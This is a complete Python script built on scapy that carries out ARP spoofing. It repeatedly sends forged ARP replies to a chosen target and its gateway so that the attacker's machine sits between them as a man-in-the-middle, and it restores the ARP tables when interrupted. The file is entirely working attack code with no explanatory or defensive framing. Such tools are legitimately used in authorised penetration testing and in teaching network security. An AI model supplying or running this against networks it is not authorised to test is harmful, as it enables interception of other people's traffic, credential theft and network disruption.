import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()

    parser.add_argument("-t", "--target", dest="client_IP", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway_IP", help="Router IP")

    options = parser.parse_args()
    if not options.client_IP:
        parser.error("[-] Please specify a target IP, use --help for more info")
    elif not options.gateway_IP:
        parser.error("[-] Please specify a router IP, use --help for more info")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    restore_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(restore_packet, count=4, verbose=False)

options = get_arguments()

try:
    sent_packets_counts = 0
    while True:
        spoof(options.client_IP, options.gateway_IP)
        spoof(options.gateway_IP, options.client_IP)
        sent_packets_counts += 2
        print("\r[+] Packets sent: " + str(sent_packets_counts), end="")
        time.sleep(2)
        
except KeyboardInterrupt:
    print("\n[+] Detected Ctrl+C ..... Resetting ARP tables")
    restore(options.client_IP, options.gateway_IP)
    restore(options.gateway_IP, options.client_IP)